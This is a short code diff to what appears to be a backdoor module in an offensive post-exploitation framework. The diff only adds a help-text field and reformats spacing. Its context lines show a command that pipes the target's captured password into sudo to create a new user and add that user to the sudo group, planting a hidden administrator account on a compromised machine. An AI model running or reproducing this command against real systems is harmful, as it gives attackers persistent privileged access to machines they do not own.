@@ -13,10 +13,11 @@ class User(Backdoor):
 		}
         self.allow_modules = True
         self.modules = {}
+        self.help_text = "" 
 
     def get_command(self):
-        user=self.get_value("name")
-        password=self.get_value("password")
+        user = self.get_value("name")
+        password = self.get_value("password")
         return ("echo " + self.core.curtarget.pword + " | sudo -S useradd -M -p $(openssl passwd -1 \""+ str(password) +"\") " + str(user) + "; echo " + self.core.curtarget.pword + " | sudo -S usermod -a -G sudo " + str(user))
     
     def do_exploit(self, args):
